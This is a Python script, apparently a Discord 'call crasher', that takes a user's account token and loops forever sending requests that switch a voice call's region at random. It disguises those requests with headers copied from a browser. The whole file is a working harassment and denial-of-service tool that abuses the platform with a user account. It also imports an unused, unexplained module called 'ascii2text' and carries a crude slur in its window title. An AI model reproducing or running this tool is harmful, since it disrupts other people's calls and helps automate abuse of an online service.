import requests, time, random, sys, os, ascii2text

class Colors:
    red = "\x1b[1;31m"
    green = "\x1b[1;32m"
    white = "\x1b[1;37m"
    orange = "\x1b[0;33m"
    
valid = 0
invalid = 0
total = 0
regions = [
    "brazil", "hongkong", "india", 
    "japan", "rotterdam", "russia", "singapore", 
    "southafrica","sydney", "us-central", "us-east", 
    "us-south", "us-west"
]

def cookies():
    r = requests.get("https://discord.com")
    cookie = r.cookies.get_dict()
    cookie["locale"] = "fr"
    return cookie

art = f"""

 ▄████▄   ██▀███   ▄▄▄        ██████  ██░ ██     ██▒   █▓ ▒█████   ▄████▄     
▒██▀ ▀█  ▓██ ▒ ██▒▒████▄    ▒██    ▒ ▓██░ ██▒   ▓██░   █▒▒██▒  ██▒▒██▀ ▀█     
▒▓█    ▄ ▓██ ░▄█ ▒▒██  ▀█▄  ░ ▓██▄   ▒██▀▀██░    ▓██  █▒░▒██░  ██▒▒▓█    ▄    
▒▓▓▄ ▄██▒▒██▀▀█▄  ░██▄▄▄▄██   ▒   ██▒░▓█ ░██      ▒██ █░░▒██   ██░▒▓▓▄ ▄██▒   
▒ ▓███▀ ░░██▓ ▒██▒ ▓█   ▓██▒▒██████▒▒░▓█▒░██▓      ▒▀█░  ░ ████▓▒░▒ ▓███▀ ░   
░ ░▒ ▒  ░░ ▒▓ ░▒▓░ ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒      ░ ▐░  ░ ▒░▒░▒░ ░ ░▒ ▒  ░   
  ░  ▒     ░▒ ░ ▒░  ▒   ▒▒ ░░ ░▒  ░ ░ ▒ ░▒░ ░      ░ ░░    ░ ▒ ▒░   ░  ▒      by Eneer
░          ░░   ░   ░   ▒   ░  ░  ░   ░  ░░ ░        ░░  ░ ░ ░ ▒  ░           
░ ░         ░           ░  ░      ░   ░  ░  ░         ░      ░ ░  ░ ░         
░                                                    ░            ░           
"""

def main():
    print(art)
    time.sleep(0.5)
    callreaper()

def callreaper():
    global valid
    global invalid
    global total
    checktoken = os.path.getsize("token.txt")
    if checktoken == 0:
        token = input(f"{Colors.white}[{Colors.red}ϟ{Colors.white}]{Colors.red} Token: {Colors.white}")
        ans = input(f"{Colors.white}[{Colors.red}ϟ{Colors.white}]{Colors.red} Remember Token? {Colors.white}y{Colors.red}/{Colors.white}n{Colors.red}:{Colors.white} ")
        if ans == "y":
            with open("token.txt", "a") as f:
                f.write(token + "\n")
        elif ans == "n":
            pass
        else:
            print(f"{Colors.white}[{Colors.red}!{Colors.white}]{Colors.red} Invalid Option {Colors.white}")
    else:
        with open("token.txt", "r", encoding="utf-8") as f:
            for line in f:
                token = line.strip()
    r = requests.get("https://discord.com/api/v9/users/@me/library", headers={"authorization": token, "content-type": "application/json"})
    if r.status_code == 200:
        print(f"{Colors.white}" + "[" + f"{Colors.green}" + "+" + f"{Colors.white}" + "]" + f"{Colors.green}" + " Valid Token" + f"{Colors.white}")
    else:
        print(f"{Colors.white}" + "[" + f"{Colors.red}" + "!" + f"{Colors.white}" + "]" + f"{Colors.red}" + " Invalid Token" + f"{Colors.white}")
    callid = input(f"{Colors.white}" + "[" + f"{Colors.red}" + "ϟ" + f"{Colors.white}" + "]" + f"{Colors.red}" + " Call ID: " + f"{Colors.white}")
    print(f"{Colors.white}[{Colors.orange}*{Colors.white}]{Colors.orange} CTRL+C anytime to stop {Colors.white}")
    while True:
        try:
            os.system(f"title Changing Call Region ^| Success: {valid} ^| Error: {invalid} ^| Total: {total}")
            headers = {
                "authority": "discord.com",
                "method": "PATCH",
                "path": f"/api/v9/channels/{callid}/call",
                "scheme": "https",
                "accept": "*/*",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "fr-FR, fr;q=0.9",
                "authorization": token,
                "content-length": "21",
                "content-type": "application/json",
                "origin": "https://discord.com",
                "referer": f"https://discord.com/channels/@me/{callid}",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "sec-gpc": "1",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.61 Safari/537.36",
                "x-debug-options": "bugReporterEnabled",
                "x-discord-locale": "fr",
                "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImZyLUZSIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwMi4wLjUwMDUuNjEgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6IjEwMi4wLjUwMDUuNjEiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6IiIsInJlZmVycmluZ19kb21haW4iOiIiLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTMwMDg5LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ=="
            }
            r = requests.patch(f"https://discord.com/api/v9/channels/{callid}/call", headers=headers, cookies=cookies(), json={"region": random.choice(regions)})
            if r.status_code == 204:
                valid += 1
                total += 1
                print(f"{Colors.white}[{Colors.green}+{Colors.white}]{Colors.green} Changed Region {Colors.white}({Colors.green}{valid}{Colors.white})")
            else:
                invalid += 1
                total += 1
                print(f"{Colors.white}[{Colors.red}-{Colors.white}]{Colors.red} Failed {r.json()} {Colors.white}({Colors.red}{invalid}{Colors.white})")
        except KeyboardInterrupt:
            print(f"{Colors.white}[{Colors.orange}*{Colors.white}]{Colors.orange} Loop breaked! {Colors.white}")
            time.sleep(0.5)
            sys.exit()
    
if __name__ == "__main__":
    os.system("cls")
    os.system(f'mode con: cols=90 lines=30')
    os.system("title Discord Region Call Raper")
    main()
